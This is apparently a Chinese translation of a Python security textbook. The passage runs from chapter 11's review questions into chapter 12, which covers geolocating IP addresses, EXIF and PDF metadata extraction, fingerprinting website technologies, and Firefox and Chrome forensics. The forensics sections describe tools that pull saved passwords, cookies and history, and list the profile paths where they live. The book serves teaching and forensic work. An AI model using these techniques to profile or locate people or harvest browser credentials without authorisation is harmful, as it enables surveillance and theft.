在下一章中，我们将探讨用于提取有关地理位置 IP 地址的信息、提取图像和文档的元数据以及识别网站前端和后端使用的 Web 技术的编程包和 Python 模块。

# 问题

1.  以下哪项是一种攻击，将恶意脚本注入到网页中，以将用户重定向到假网站或收集个人信息？

1.  攻击者将 SQL 数据库命令插入到 Web 应用程序使用的订单表单的数据输入字段中的技术是什么？

1.  有哪些工具可以检测与 JavaScript 相关的 Web 应用程序中的漏洞？

1.  有什么工具可以从网站获取数据结构？

1.  有什么工具可以检测 Web 应用程序中与 SQL 注入类型漏洞相关的漏洞？

1.  w3af 工具中的哪个配置文件执行扫描以识别更高风险的漏洞，如 SQL 注入和跨站脚本（XSS）？

1.  w3af API 中的主要类包含启用插件、确定攻击目标和管理配置文件所需的所有方法和属性是什么？

1.  slmap 选项是列出所有可用数据库的选项吗？

1.  nmap 脚本的名称是什么，可以让我们在服务器中扫描 Heartbleed 漏洞？

1.  建立 SSL 连接的过程是什么，包括对称和非对称密钥的交换，以建立客户端和服务器之间的加密连接？

# 进一步阅读

在以下链接中，您将找到有关本章中提到的工具的更多信息：

+   [`www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/`](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

+   [`blog.sqreen.io/preventing-sql-injections-in-python/`](https://blog.sqreen.io/preventing-sql-injections-in-python/)

+   [`hackertarget.com/sqlmaptutorial`](https://hackertarget.com/sqlmaptutorial)

+   [`packetstormsecurity.com/files/tags/python`](https://packetstormsecurity.com/files/tags/python)

+   [`packetstormsecurity.com/files/90362/Simple-Log-File-Analyzer 1.0.html`](https://packetstormsecurity.com/files/90362/Simple-Log-File-Analyzer%201.0.html)

+   [`github.com/mpgn/heartbleed-PoC`](https://github.com/mpgn/heartbleed-PoC)


# 第十二章：从文档、图像和浏览器中提取地理位置和元数据

本章涵盖了 Python 中用于提取 IP 地址地理位置信息、从图像和文档中提取元数据以及识别网站前端和后端使用的 Web 技术的主要模块。此外，我们还介绍了如何从 Chrome 和 Firefox 浏览器中提取元数据以及与存储在 sqlite 数据库中的下载、cookie 和历史数据相关的信息。

本章将涵盖以下主题：

+   用于地理位置的`pygeoip`和`pygeocoder`模块

+   如何使用`Python Image`库从图像中提取元数据

+   如何使用`pypdf`模块从 PDF 文档中提取元数据

+   如何识别网站使用的技术

+   如何从 Chrome 和 Firefox 等网络浏览器中提取元数据

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter 12`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地计算机上安装至少 4GB 内存的 Python 发行版。

# 提取地理位置信息

在本节中，我们将回顾如何从 IP 地址或域名中提取地理位置信息。

# 地理位置介绍

从 IP 地址或域名获取地理位置的一种方法是使用提供此类信息的服务。在提供此信息的服务中，我们可以强调 hackertarget.com ([`hackertarget.com/geoip-ip-location-lookup/`](https://hackertarget.com/geoip-ip-location-lookup/))。

通过[hackertarget.com](http://hackertarget.com)，我们可以从 IP 地址获取地理位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/04da526f-00a3-4154-b344-e4ec7d7f5970.png)

该服务还提供了一个用于从 IP 地址获取地理位置的 REST API：[`api.hackertarget.com/geoip/?q=8.8.8.8`](https://api.hackertarget.com/geoip/?q=8.8.8.8)。

另一个服务是`api.hostip.info`，它提供了按 IP 地址查询的服务：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3ca09e55-c965-4e81-b66c-4f4bdd84e344.png)

在下一个脚本中，我们使用此服务和`requests`模块来获取包含地理位置信息的 json 响应。

您可以在`ip_to_geo.py`文件中找到以下代码：

```py
import requests

class IPtoGeo(object):

    def __init__(self, ip_address):

        # Initialize objects to store
        self.latitude = ''
        self.longitude = ''
        self.country = ''
        self.city = ''
        self.ip_address = ip_address
        self._get_location()

    def _get_location(self):
        json_request = requests.get('http://api.hostip.info/get_json.php ip=%s&position=true' % self.ip_address).json()

        self.country = json_request['country_name']
        self.country_code = json_request['country_code']
        self.city = json_request['city']
        self.latitude = json_request['lat']
        self.longitude = json_request['lng']

if __name__ == '__main__':
    ip1 = IPtoGeo('8.8.8.8')
    print(ip1.__dict__)
```

这是前一个脚本的**输出**：

```py
{'latitude': '37.402', 'longitude': '-122.078', 'country': 'UNITED STATES', 'city': 'Mountain View, CA', 'ip_address': '8.8.8.8', 'country_code': 'US'}
```

# Pygeoip 介绍

`Pygeoip`是 Python 中可用的模块之一，允许您从 IP 地址检索地理信息。它基于 GeoIP 数据库，这些数据库根据其类型（城市、地区、国家、ISP）分布在几个文件中。该模块包含几个函数来检索数据，例如国家代码、时区或包含与特定地址相关的所有信息的完整注册。

`Pygeoip`可以从官方 GitHub 存储库下载：[`github.com/appliedsec/pygeoip`](http://github.com/appliedsec/pygeoip)。

如果我们查询模块的帮助，我们会看到必须使用的主要类来实例化允许我们进行查询的对象：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/0ee0956f-9aa4-4942-a081-23a5431e4c64.png)

要构建对象，我们使用一个接受文件作为参数的数据库的构造函数。此文件的示例可以从以下网址下载：[`dev.maxmind.com/geoip/legacy/geolite`](http://dev.maxmind.com/geoip/legacy/geolite)。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1062cdc6-46f3-4ce5-b7d2-713f98345e54.png)

此类中可用的以下方法允许您从 IP 地址或域名获取国家名称。

您可以在`**geoip.py**`文件中找到以下代码，该文件位于`pygeopip`文件夹中：

```py
import pygeoip
import pprint
gi = pygeoip.GeoIP('GeoLiteCity.dat')
pprint.pprint("Country code: %s " %(str(gi.country_code_by_addr('173.194.34.192'))))
pprint.pprint("Country code: %s " %(str(gi.country_code_by_name('google.com'))))
pprint.pprint("Country name: %s " %(str(gi.country_name_by_addr('173.194.34.192'))))
pprint.pprint("Country code: %s " %(str(gi.country_name_by_name('google.com'))))
```

还有一些方法可以从 IP 和主机地址中获取组织和服务提供商：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8926cf88-04bd-4d61-91aa-f29823539be8.png)

这是从 IP 地址和域名获取特定组织信息的示例：

```py
gi2 = pygeoip.GeoIP('GeoIPASNum.dat')
pprint.pprint("Organization by addr: %s " %(str(gi2.org_by_addr('173.194.34.192'))))
pprint.pprint("Organization by name: %s " %(str(gi2.org_by_name('google.com'))))
```

还有一些方法可以让我们以字典形式获取有关国家、城市、纬度或经度的数据结构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/b1cca883-a48c-4887-93eb-6da123e990bd.png)

这是一个从 IP 地址获取地理位置信息的示例：

```py
for record,value in gi.record_by_addr('173.194.34.192').items():
    print(record + "-->" + str(value))
```

我们可以看到上一个脚本返回的所有地理位置信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/971e5d90-8cd3-4b50-9499-d2a27403a429.png)

在下一个脚本中，我们有两种方法，`geoip_city()`用于获取有关位置的信息，`geoip_country()`用于获取国家，两者都是从 IP 地址获取的。

在这两种方法中，首先实例化一个带有包含数据库的文件路径的`GeoIP`类。接下来，我们将查询特定记录的数据库，指定 IP 地址或域。这将返回一个包含城市、`region_name`、`postal_code`、`country_name`、`latitude`和`longitude`字段的记录。

您可以在`pygeopip`文件夹中的`pygeoip_test.py`文件中找到以下代码：

```py
import pygeoip

def main():
 geoip_country() 
 geoip_city()

def geoip_city():
 path = 'GeoLiteCity.dat'
 gic = pygeoip.GeoIP(path)
 print(gic.record_by_addr('64.233.161.99'))
 print(gic.record_by_name('google.com'))
 print(gic.region_by_name('google.com'))
 print(gic.region_by_addr('64.233.161.99'))

def geoip_country(): 
 path = 'GeoIP.dat'
 gi = pygeoip.GeoIP(path)
 print(gi.country_code_by_name('google.com'))
 print(gi.country_code_by_addr('64.233.161.99'))
 print(gi.country_name_by_name('google.com'))
 print(gi.country_name_by_addr('64.233.161.99'))

if __name__ == '__main__':
 main()
```

我们可以看到返回的信息对于两种情况是相同的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4c071006-cd8a-48ea-8b8b-06e00dfdf1ec.png)

# pygeocoder 简介

`pygeocoder`是一个简化使用 Google 地理位置功能的 Python 模块。使用此模块，您可以轻松找到与坐标对应的地址，反之亦然。我们还可以使用它来验证和格式化地址。

该模块位于官方 Python 存储库中，因此您可以使用`pip`来安装它。在[`pypi.python.org/pypi/pygeocoder`](https://pypi.python.org/pypi/pygeocoder)URL 中，我们可以看到此模块的最新版本：`$ pip install pygeocoder`。

该模块使用 Google Geocoding API v3 服务从特定地址检索坐标：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7360aef5-9517-48e7-a26e-29c8c7a9d535.png)

该模块的主要类是`Geocoder`类，它允许从地点描述和特定位置进行查询。

在这个截图中，我们可以看到`GeoCoder`类的`help`命令的返回：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/874c59b5-88f5-49f3-a0bf-a8b1b9f20865.png)

从地点描述中获取地点、坐标、纬度、经度、国家和邮政编码的示例。您还可以执行反向过程，即从对应于地理点的纬度和经度的坐标开始，可以恢复该站点的地址。

您可以在`pygeocoder`文件夹中的`PyGeoCoderExample.py`文件中找到以下代码：

```py
from pygeocoder import Geocoder

results = Geocoder.geocode("Mountain View")

print(results.coordinates)
print(results.country)
print(results.postal_code)
print(results.latitude)
print(results.longitude)
results = Geocoder.reverse_geocode(results.latitude, results.longitude)
print(results.formatted_address)
```

我们可以看到上一个脚本返回的所有地理位置信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7c2b63cf-17e6-4c0b-8fd1-3fe517203204.png)

# Python 中的 MaxMind 数据库

还有其他使用 MaxMind 数据库的 Python 模块：

+   **geoip2:** 提供对 GeoIP2 网络服务和数据库的访问

+   [`github.com/maxmind/GeoIP2-python`](https://github.com/maxmind/GeoIP2-python)

+   **maxminddb-geolite2:** 提供一个简单的 MaxMindDB 阅读器扩展

+   [`github.com/rr2do2/maxminddb-geolite2`](https://github.com/rr2do2/maxminddb-geolite2)

在下一个脚本中，我们可以看到如何使用`maxminddb-geolite2`包的示例。

您可以在`geolite2_example.py`文件中找到以下代码：

```py
import socket
from geolite2 import geolite2
import argparse
import json

if __name__ == '__main__':
 # Commandline arguments
 parser = argparse.ArgumentParser(description='Get IP Geolocation info')
 parser.add_argument('--hostname', action="store", dest="hostname",required=True)

# Parse arguments
 given_args = parser.parse_args()
 hostname = given_args.hostname
 ip_address = socket.gethostbyname(hostname)
 print("IP address: {0}".format(ip_address))

# Call geolite2
 reader = geolite2.reader()
 response = reader.get(ip_address)
 print (json.dumps(response['continent']['names']['en'],indent=4))
 print (json.dumps(response['country']['names']['en'],indent=4))
 print (json.dumps(response['location']['latitude'],indent=4))
 print (json.dumps(response['location']['longitude'],indent=4))
 print (json.dumps(response['location']['time_zone'],indent=4))
```

在这个截图中，我们可以看到使用 google.com 作为主机名执行上一个脚本：

`python geolite2_example.py --hostname google.com`

此脚本将显示类似于以下内容的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/39c1d15f-fd21-4639-b49c-70fc88b615cc.png)

# 从图像中提取元数据

在这一部分，我们将回顾如何使用 PIL 模块从图像中提取 EXIF 元数据。

# Exif 和 PIL 模块简介

我们在 Python 中找到的用于处理和操作图像的主要模块之一是`PIL`。`PIL`模块允许我们提取图像的`EXIF`元数据。

**Exif（Exchange Image File Format）**是一个规范，指示在保存图像时必须遵循的规则，并定义了如何在图像和音频文件中存储元数据。这个规范今天在大多数移动设备和数码相机中应用。

`PIL.ExifTags`模块允许我们从这些标签中提取信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f92bcdd3-de77-40ae-b712-31142fd3c023.png)

我们可以在`pillow`模块内的`exiftags`包的官方文档中查看官方文档：

ExifTags 包含一个带有许多众所周知的`EXIF 标签`的常量和名称的字典结构。

在这张图片中，我们可以看到`TAGS.values()`方法返回的所有标签：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/5d180f44-29e7-424e-b1c4-523fcc817f78.png)

# 从图像获取 EXIF 数据

首先，我们导入了`PIL`图像和`PIL TAGS`模块。`PIL`是 Python 中的图像处理模块。它支持许多文件格式，并具有强大的图像处理能力。然后我们遍历结果并打印值。还有许多其他模块支持 EXIF 数据提取，例如`ExifRead`。在这个例子中，为了获取`EXIF`数据，我们可以使用`_getexif()`方法。

您可以在`exiftags`文件夹中的`get_exif_tags.py`文件中找到以下代码：

```py
from PIL import Image
from PIL.ExifTags import TAGS

for (i,j) in Image.open('images/image.jpg')._getexif().items():
    print('%s = %s' % (TAGS.get(i), j))
```

# 了解 Exif 元数据

要获取图像的`EXIF`标签信息，可以使用图像对象的`_getexif()`方法。例如，我们可以编写一个函数，在图像路径中，可以返回`EXIF`标签的信息。

在`exiftags`文件夹中的`extractDataFromImages.py`文件中提供了以下函数：

```py
def get_exif_metadata(image_path):
    exifData = {}
    image = Image.open(image_path)
    if hasattr(image, '_getexif'):
        exifinfo = image._getexif()
        if exifinfo is not None:
            for tag, value in exifinfo.items():
                decoded = TAGS.get(tag, tag)
                exifData[decoded] = value
 decode_gps_info(exifData)
 return exifData
```

这些信息可以通过解码我们以纬度-经度值格式获得的信息来改进，对于它们，我们可以编写一个函数，给定`GPSInfo`类型的`exif`属性，解码该信息：

```py
def decode_gps_info(exif):
    gpsinfo = {}
    if 'GPSInfo' in exif:
    '''
    Raw Geo-references
    for key in exif['GPSInfo'].keys():
        decode = GPSTAGS.get(key,key)
        gpsinfo[decode] = exif['GPSInfo'][key]
    exif['GPSInfo'] = gpsinfo
    '''

     #Parse geo references.
     Nsec = exif['GPSInfo'][2][2][0] / float(exif['GPSInfo'][2][2][1])
     Nmin = exif['GPSInfo'][2][1][0] / float(exif['GPSInfo'][2][1][1])
     Ndeg = exif['GPSInfo'][2][0][0] / float(exif['GPSInfo'][2][0][1])
     Wsec = exif['GPSInfo'][4][2][0] / float(exif['GPSInfo'][4][2][1])
     Wmin = exif['GPSInfo'][4][1][0] / float(exif['GPSInfo'][4][1][1])
     Wdeg = exif['GPSInfo'][4][0][0] / float(exif['GPSInfo'][4][0][1])
     if exif['GPSInfo'][1] == 'N':
         Nmult = 1
     else:
         Nmult = -1
     if exif['GPSInfo'][1] == 'E':
         Wmult = 1
     else:
         Wmult = -1
         Lat = Nmult * (Ndeg + (Nmin + Nsec/60.0)/60.0)
         Lng = Wmult * (Wdeg + (Wmin + Wsec/60.0)/60.0)
         exif['GPSInfo'] = {"Lat" : Lat, "Lng" : Lng}
```

在上一个脚本中，我们将 Exif 数据解析为一个由元数据类型索引的数组。有了完整的数组，我们可以搜索数组，看它是否包含`GPSInfo`的`Exif`标签。如果它包含`GPSInfo`标签，那么我们将知道该对象包含 GPS 元数据，我们可以在屏幕上打印一条消息。

在下面的图像中，我们可以看到我们还在`GPSInfo`对象中获取了有关图像位置的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/e0157494-f454-414c-a0bc-088c111e5445.png)

# 从网络图像中提取元数据

在本节中，我们将构建一个脚本，连接到一个网站，下载网站上的所有图像，然后检查它们的`Exif`元数据。

对于这个任务，我们使用了 Python3 的`urllib`模块，提供了`parse`和`request`包：

[`docs.python.org/3.0/library/urllib.parse.html`](https://docs.python.org/3.0/library/urllib.parse.html)

[`docs.python.org/3.0/library/urllib.request.html`](https://docs.python.org/3.0/library/urllib.request.html)

您可以在`exiftags`文件夹中的`exif_images_web_page.py`文件中找到以下代码。

此脚本包含使用`BeautifulSoup`和`lxml 解析器`在网站中查找图像以及在图像文件夹中下载图像的方法：

```py
def findImages(url):
    print('[+] Finding images on ' + url)
    urlContent = requests.get(url).text
    soup = BeautifulSoup(urlContent,'lxml')
    imgTags = soup.findAll('img')
    return imgTags

def downloadImage(imgTag):
    try:
        print('[+] Dowloading in images directory...'+imgTag['src'])
        imgSrc = imgTag['src']
        imgContent = urlopen(imgSrc).read()
        imgFileName = basename(urlsplit(imgSrc)[2])
        imgFile = open('images/'+imgFileName, 'wb')
        imgFile.write(imgContent)
        imgFile.close()
        return imgFileName
    except Exception as e:
        print(e)
        return ''
```

这是从图像目录中提取图像元数据的函数：

```py
def printMetadata():
    print("Extracting metadata from images in images directory.........")
    for dirpath, dirnames, files in os.walk("images"):
    for name in files:
        print("[+] Metadata for file: %s " %(dirpath+os.path.sep+name))
            try:
                exifData = {}
                exif = get_exif_metadata(dirpath+os.path.sep+name)
                for metadata in exif:
                print("Metadata: %s - Value: %s " %(metadata, exif[metadata]))
            except:
                import sys, traceback
                traceback.print_exc(file=sys.stdout)
```

这是我们的主要方法，它从参数中获取一个 url，并调用`findImages(url)`，`downloadImage(imgTags)`和`printMetadata()`方法：

```py
def main():
    parser = optparse.OptionParser('-url <target url>')
    parser.add_option('-u', dest='url', type='string', help='specify url address')
    (options, args) = parser.parse_args()
    url = options.url
    if url == None:
        print(parser.usage)
        exit(0)
    else:#find and download images and extract metadata
       imgTags = findImages(url) print(imgTags) for imgTag in imgTags: imgFileName = downloadImage(imgTag) printMetadata()
```

# 从 pdf 文档中提取元数据

在本节中，我们将回顾如何使用`pyPDF2`模块从 pdf 文档中提取元数据。

# PyPDF2 简介

Python 中用于从 PDF 文档中提取数据的模块之一是`PyPDF2`。该模块可以直接使用 pip install 实用程序下载，因为它位于官方 Python 存储库中。

在[`pypi.org/project/PyPDF2/`](https://pypi.org/project/PyPDF2/) URL 中，我们可以看到这个模块的最新版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/96634174-b564-4c43-a5db-ad1ba4d42650.png)

该模块为我们提供了提取文档信息、加密和解密文档的能力。要提取元数据，我们可以使用`PdfFileReader`类和`getDocumentInfo()`方法，它返回一个包含文档数据的字典：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/084b4e2a-7946-45d5-b287-cacaee766c70.png)

以下函数将允许我们获取`pdf`文件夹中所有 PDF 文档的信息。

你可以在`pypdf`文件夹中的`extractDataFromPDF.py`文件中找到以下代码：

```py
#!usr/bin/env python
# coding: utf-8

from PyPDF2 import PdfFileReader, PdfFileWriter
import os, time, os.path, stat

from PyPDF2.generic import NameObject, createStringObject

class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def get_metadata():
  for dirpath, dirnames, files in os.walk("pdf"):
    for data in files:
      ext = data.lower().rsplit('.', 1)[-1]
      if ext in ['pdf']:
        print(bcolors.OKGREEN + "------------------------------------------------------------------------------------")
        print(bcolors.OKGREEN + "[--- Metadata : " + bcolors.ENDC + bcolors.BOLD + "%s " %(dirpath+os.path.sep+data) + bcolors.ENDC)
        print(bcolors.OKGREEN + "------------------------------------------------------------------------------------")
        pdf = PdfFileReader(open(dirpath+os.path.sep+data, 'rb'))
        info = pdf.getDocumentInfo()

        for metaItem in info:

          print (bcolors.OKGREEN + '[+] ' + metaItem.strip( '/' ) + ': ' + bcolors.ENDC + info[metaItem])

        pages = pdf.getNumPages()
        print (bcolors.OKGREEN + '[+] Pages:' + bcolors.ENDC, pages)

        layout = pdf.getPageLayout()
        print (bcolors.OKGREEN + '[+] Layout: ' + bcolors.ENDC + str(layout))

```

在这部分代码中，我们使用`getXmpMetadata()`方法获取与文档相关的其他信息，如贡献者、发布者和 PDF 版本：

```py
        xmpinfo = pdf.getXmpMetadata()

        if hasattr(xmpinfo,'dc_contributor'): print (bcolors.OKGREEN + '[+] Contributor:' + bcolors.ENDC, xmpinfo.dc_contributor)
        if hasattr(xmpinfo,'dc_identifier'): print (bcolors.OKGREEN + '[+] Identifier:' + bcolors.ENDC, xmpinfo.dc_identifier)
        if hasattr(xmpinfo,'dc_date'): print (bcolors.OKGREEN + '[+] Date:' + bcolors.ENDC, xmpinfo.dc_date)
        if hasattr(xmpinfo,'dc_source'): print (bcolors.OKGREEN + '[+] Source:' + bcolors.ENDC, xmpinfo.dc_source)
        if hasattr(xmpinfo,'dc_subject'): print (bcolors.OKGREEN + '[+] Subject:' + bcolors.ENDC, xmpinfo.dc_subject)
        if hasattr(xmpinfo,'xmp_modifyDate'): print (bcolors.OKGREEN + '[+] ModifyDate:' + bcolors.ENDC, xmpinfo.xmp_modifyDate)
        if hasattr(xmpinfo,'xmp_metadataDate'): print (bcolors.OKGREEN + '[+] MetadataDate:' + bcolors.ENDC, xmpinfo.xmp_metadataDate)
        if hasattr(xmpinfo,'xmpmm_documentId'): print (bcolors.OKGREEN + '[+] DocumentId:' + bcolors.ENDC, xmpinfo.xmpmm_documentId)
        if hasattr(xmpinfo,'xmpmm_instanceId'): print (bcolors.OKGREEN + '[+] InstanceId:' + bcolors.ENDC, xmpinfo.xmpmm_instanceId)
        if hasattr(xmpinfo,'pdf_keywords'): print (bcolors.OKGREEN + '[+] PDF-Keywords:' + bcolors.ENDC, xmpinfo.pdf_keywords)
        if hasattr(xmpinfo,'pdf_pdfversion'): print (bcolors.OKGREEN + '[+] PDF-Version:' + bcolors.ENDC, xmpinfo.pdf_pdfversion)

        if hasattr(xmpinfo,'dc_publisher'):
          for y in xmpinfo.dc_publisher:
            if y:
              print (bcolors.OKGREEN + "[+] Publisher:\t" + bcolors.ENDC + y) 

      fsize = os.stat((dirpath+os.path.sep+data))
      print (bcolors.OKGREEN + '[+] Size:' + bcolors.ENDC, fsize[6], 'bytes \n\n')

get_metadata()
```

os（操作系统）模块中的`walk`函数对于浏览特定目录中包含的所有文件和目录非常有用。

在这个截图中，我们可以看到先前的脚本正在读取 pdf 文件夹中的文件的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/72fb6e0e-abf0-49bf-bbbb-9e77bd3b737d.png)

它提供的另一个功能是解密使用密码加密的文档：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9e6c1da5-031c-45fe-8ef0-8206d186fcf1.png)

# Peepdf

`Peepdf`是一个分析 PDF 文件的 Python 工具，允许我们可视化文档中的所有对象。它还具有分析 PDF 文件的不同版本、对象序列和加密文件的能力，以及修改和混淆 PDF 文件的能力：[`eternal-todo.com/tools/peepdf-pdf-analysis-tool`](http://eternal-todo.com/tools/peepdf-pdf-analysis-tool)。

# 识别网站使用的技术

在这一部分中，我们将回顾如何使用 builtwith 和 Wappalyzer 来识别网站使用的技术。

# 介绍 builtwith 模块

构建网站所使用的技术类型将影响您跟踪它的方式。要识别这些信息，您可以利用 Wappalyzer 和 Builtwith 等工具（[`builtwith.com`](https://builtwith.com)）。验证网站所使用的技术类型的有用工具是 builtWith 模块，可以通过以下方式安装：

`pip install builtwith`

该模块有一个名为`parse`的方法，通过 URL 参数传递，并返回网站使用的技术作为响应。以下是一个示例：

```py
>>> import builtwith
>>> builtwith.parse('http://example.webscraping.com')
{u'javascript-frameworks': [u'jQuery', u'Modernizr', u'jQuery UI'],
u'programming-languages': [u'Python'],
u'web-frameworks': [u'Web2py', u'Twitter Bootstrap'],
u'web-servers': [u'Nginx']}
```

文档可在[`bitbucket.org/richardpenman/builtwith`](https://bitbucket.org/richardpenman/builtwith)上找到，模块可在 pypi 存储库的[`pypi.org/project/builtwith/`](https://pypi.org/project/builtwith/)上找到。

# Wappalyzer

另一个用于恢复此类信息的工具是 Wappalyzer。Wappalyzer 具有 Web 应用程序签名数据库，允许您从 50 多个类别中识别 900 多种 Web 技术。

该工具分析网站的多个元素以确定其技术，它分析以下 HTML 元素：

+   服务器上的 HTTP 响应头

+   Meta HTML 标签

+   JavaScript 文件，包括单独的文件和嵌入在 HTML 中的文件

+   特定的 HTML 内容

+   HTML 特定注释

`python-Wappalyzer`是一个用于从 Python 脚本获取此信息的 Python 接口（[`github.com/chorsley/python-Wappalyzer`](https://github.com/chorsley/python-Wappalyzer)）：

`pip install python-Wappalyzer`

我们可以轻松地使用 wappalyzer 模块获取网站前端和后端层中使用的技术的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8e3d7549-09c9-4ca7-97d8-7249430b6263.png)

# wig - webapp 信息收集器

wig 是一个用 Python3 开发的 Web 应用信息收集工具，可以识别多个内容管理系统和其他管理应用。每个检测到的 CMS 都会显示其最可能的版本。在内部，它从'server'和'x powered-by'头部获取服务器上的操作系统（[`github.com/jekyc/wig`](https://github.com/jekyc/wig)）。

这些是 wig 脚本在 Python3 环境中提供的选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/dab0ef28-bbd1-447e-83d9-c69820d648cc.png)

在这张图片中，我们可以看到[testphp.vulneb.com](http://testphp.vulneb.com)网站使用的技术：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/da6a018b-c973-400c-ba94-be4bd3af290b.png)

在这张图片中，我们可以看到它是如何检测到[drupal.com](http://drupal.com)网站使用的 CMS 版本和其他有趣的文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9305f9f7-6133-4d00-8e5c-b4f1643a74f3.png)

# 从 Web 浏览器中提取元数据

在本节中，我们将审查如何从浏览器中提取元数据，例如 chrome 和 firefox。

# 使用 dumpzilla 进行 Python 中的 Firefox 取证

Dumpzilla 是一个非常有用，多功能和直观的工具，专门用于 Mozilla 浏览器的取证分析。Dumpzilla 能够从 Firefox，Iceweasel 和 Seamonkey 浏览器中提取所有相关信息，以便进一步分析，以提供有关遭受攻击，密码和电子邮件的线索。它在 Unix 系统和 Windows 32/64 位下运行。

该应用程序在命令行下运行，我们可以访问大量有价值的信息，其中包括：

+   Cookies + DOM 存储（HTML 5）

+   用户偏好（域权限，代理设置）

+   查看下载历史记录

+   Web 表单数据（搜索，电子邮件，评论等）

+   标记

+   浏览器中保存的密码

+   提取 HTML5 缓存（离线缓存）

+   插件和扩展以及它们使用的路由或 URL

+   添加为例外的 SSL 证书

为了完成对浏览器的取证分析，建议使用缓存中的数据提取应用程序，例如 MozCache ([`mozcache.sourceforge.net`](http://mozcache.sourceforge.net))。

要求：

+   Python 3.x 版本

+   Unix 系统（Linux 或 Mac）或 Windows 系统

+   可选的`Python Magic`模块：[`github.com/ahupp/python-magic`](https://github.com/ahupp/python-magic)

# Dumpzilla 命令行

找到要进行审计的浏览器配置文件目录。这些配置文件位于不同的目录中，具体取决于您的操作系统。第一步是了解存储浏览器用户配置文件信息的目录。

每个操作系统的位置如下：

+   Win7 和 10 配置文件：`'C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default'`

+   MacOS 配置文件：`'/Users/$USER/Library/Application Support/Firefox/Profiles/xxxx.default'`

+   Unix 配置文件：`'/home/$USER/.mozilla/firefox/xxxx.default'`

您可以从 git 存储库下载`dumpzilla` Python 脚本，并使用 Python3 运行该脚本，指向您的浏览器配置文件目录的位置：[`github.com/Busindre/dumpzilla`](https://github.com/Busindre/dumpzilla)。

这些是脚本提供的选项：

```py
python3 dumpzilla.py "/root/.mozilla/firefox/[Your Profile.default]"
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/e2a8fff8-a533-46c2-b5cb-2d367f649f00.png)

这将返回有关互联网浏览信息的报告，然后显示所收集信息的摘要图表：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f56fbaef-b459-4144-9333-b27ca3cc2bbd.png)

# 使用 firefeed 进行 Python 中的 Firefox 取证

Firefed 是一个工具，以命令行模式运行，允许您检查 Firefox 配置文件。可以提取存储的密码，偏好设置，插件和历史记录（[`github.com/numirias/firefed`](https://github.com/numirias/firefed)）。

这些是`firefed`脚本提供的选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/316eecbb-179b-4dff-be66-172f3b61937d.png)

该工具读取位于您的用户名火狐配置文件中的`profiles.ini`文件。

在 Windows 操作系统中，此文件位于`C:\Users\username\AppData\Roaming\Mozilla\Firefox`。

您还可以使用`%APPDATA%\Mozilla\Firefox\Profiles`命令检测此文件夹。

有关更多信息，请参阅 mozilla 网站的官方文档：[`support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data#w_how-do-i-find-my-profile`](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data#w_how-do-i-find-my-profile)。

# 使用 Python 进行 Chrome 取证

Google Chrome 将浏览历史记录存储在以下位置的 SQLite 数据库中：

+   Windows 7 和 10：`C:\Users\[USERNAME]\AppData\Local\Google\Chrome\`

+   Linux：`/home/$USER/.config/google-chrome/`

包含浏览历史记录的数据库文件存储在名为“History”的 Default 文件夹下，可以使用任何 SQlite 浏览器（[`sqlitebrowser.org/`](https://sqlitebrowser.org/)）进行检查。

在 Windows 计算机上，该数据库通常可以在以下路径下找到：

`C:\Users\<YOURUSERNAME>\AppData\Local\Google\Chrome\User Data\Default`

例如，在 Windows 操作系统中，路径为`C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History`，我们可以找到存储 Chrome 浏览历史记录的 SQLite 数据库。

这是历史数据库和相关字段的表：

